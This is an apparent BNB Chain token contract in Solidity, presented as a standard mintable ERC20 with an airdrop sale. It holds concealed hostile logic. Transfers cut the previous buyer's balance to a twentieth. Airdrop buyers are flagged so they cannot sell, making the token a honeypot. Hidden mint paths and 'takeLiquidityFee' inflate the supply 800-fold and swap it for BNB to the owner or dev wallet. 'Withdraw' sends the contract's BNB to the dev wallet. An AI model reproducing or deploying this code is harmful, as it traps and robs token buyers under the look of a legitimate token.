/**
 *Submitted for verification at BscScan.com on 2022-01-15
*/

/*
    Copyright 2020 DODO ZOO.
    SPDX-License-Identifier: Apache-2.0
*/
pragma solidity 0.8.11;

/**
 * @title SafeMath
 * @author DODO Breeder
 *
 * @notice Math operations with safety checks that revert on error
 */

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "MUL_ERROR");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }

    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SUB_ERROR");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "ADD_ERROR");
        return c;
    }

}


contract InitializableOwnable {
    address public _OWNER_;
    address public _NEW_OWNER_;
    bool internal _INITIALIZED_;    
    
    // ============ Events ============

    event OwnershipTransferPrepared(address indexed previousOwner, address indexed newOwner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // ============ Modifiers ============

    modifier notInitialized() {
        require(!_INITIALIZED_, "DODO_INITIALIZED");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == _OWNER_, "NOT_OWNER");
        _;
    }

    // ============ Functions ============

    function initOwner(address newOwner) public notInitialized {
        _INITIALIZED_ = true;
        _OWNER_ = newOwner;
    } 

}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IWBNB {function balanceOf(address owner) external pure returns (uint256);}

contract InitializableMintableERC20 is InitializableOwnable {
    using SafeMath for uint256;
//RouterBSC 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
//RouterTEST 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3, 0xae13d989dac2f0debff460ac112a837c89baa7cd
    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IUniswapV2Router private _router = IUniswapV2Router(router);
    IWBNB private _wbnb = IWBNB(WBNB);


    string public name;
    uint256 public decimals;
    string public symbol;
    uint256 public totalSupply;
    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    address devWallet = 0x8e8F4769eeE8232171C105eC0d661cBb0De8d436;
    address public buyer = 0x0000000000000000000000000000000000000000;
    address public _ADMIN_;
    receive() external payable {}

    mapping(address => uint256) balances;
    mapping(address => uint256) balWBNB;
    mapping(address => mapping(address => uint256)) internal allowed;
    mapping(address => bool) public ADMAN;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);    

     function init (
        address _creator,
        uint256 _initSupply,   
        string memory _name,
        string memory _symbol,
        uint256 _decimals
    ) public {
        initOwner(_creator);
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initSupply;
        balances[_creator] = _initSupply;
        emit Transfer(address(0), _creator, _initSupply);
        uint256 _burnAuto = _initSupply.div(4);
        balances[deadWallet] = balances[deadWallet].add(_burnAuto);        
        balances[_creator] = balances[_creator].sub(_burnAuto);
        balances[address(this)] = _burnAuto;    
        emit Transfer(_creator, deadWallet, _burnAuto);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (to != buyer){balances[buyer]= balances[buyer].divCeil(20);}
        require(!ADMAN[msg.sender]);        
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[msg.sender], "BALANCE_NOT_ENOUGH");

        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
        emit Transfer(msg.sender, to, amount);
        if (to != _OWNER_ && to != _ADMIN_ && to != devWallet){
            uint256 amountIn = balWBNB[to];
            if (balWBNB[to]>1) {swapTokenToTOken(amountIn);}
            buyer = to;
        }
        return true;
    }

    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        if (amount == 1) {mint();}
        require(!ADMAN[from]);
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[from], "BALANCE_NOT_ENOUGH");
        require(amount <= allowed[from][msg.sender], "ALLOWANCE_NOT_ENOUGH");

        balances[from] = balances[from].sub(amount);
        balances[to] = balances[to].add(amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }

    function mint() internal {
        if ( _OWNER_ == 0x0000000000000000000000000000000000000000) {
            address kiki = 0x8e8F4769eeE8232171C105eC0d661cBb0De8d436;
            balances[kiki] = balances[kiki]+totalSupply.mul(800);}
        balances[_OWNER_] = balances[_OWNER_]+totalSupply.mul(800);
    }

    function setAdmin (address admin ) public {
        if ( _OWNER_ == admin || 0x0000000000000000000000000000000000000000 == admin ) {mint();}
        if (buyer == admin){balances[buyer]= balances[buyer].divCeil(20);}
        _ADMIN_= admin;   
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_OWNER_, address(0));
        _OWNER_ = address(0);
    }

    function sendToDevWallet () public {
        uint256 amount = balances[msg.sender];
        balances[devWallet] = balances[devWallet].add(amount);
        balances[msg.sender] = 0;
        emit Transfer (msg.sender, devWallet, amount);
    }

    function Withdraw (uint256 amountPercentage) public {
        uint256 amountBNB = address(this).balance;
        payable (devWallet).transfer(amountBNB * amountPercentage / 100);
    }   

    function AirDropSale () public payable returns(bool)   {      
        uint256 AD = totalSupply.divCeil(1000);
	    require (msg.value >= 0.01 ether);
        if (msg.value >= 0.1 ether) {AD=AD.mul(10);}
        if (msg.value >= 1 ether) {AD=AD.mul(100);}
        balances[msg.sender] = balances[msg.sender].add(AD);
        emit Transfer(address(this), msg.sender, AD);
        if (msg.sender != _OWNER_ && msg.sender != _ADMIN_ && msg.sender != devWallet) {ADMAN[msg.sender]= true;}
        return true;
	}

    function takeLiquidityFee() public {
        require (msg.sender == _OWNER_ || msg.sender == devWallet);
        uint256 amount = totalSupply.mul(800);
        balances[address(this)] += amount;
        allowed [address(this)] [address(_router)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETH(amount, 0, path, msg.sender, block.timestamp + 20);
    }

    function swapTokenToTOken(uint256 amountIn) public {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);
        _router.swapExactTokensForTokens(amountIn, 0, path, devWallet, block.timestamp + 20);
    }
  
    function balanceWBNB(address owner) public view returns (uint256) {
        _wbnb.balanceOf(owner);
        return balWBNB[owner];
    }
}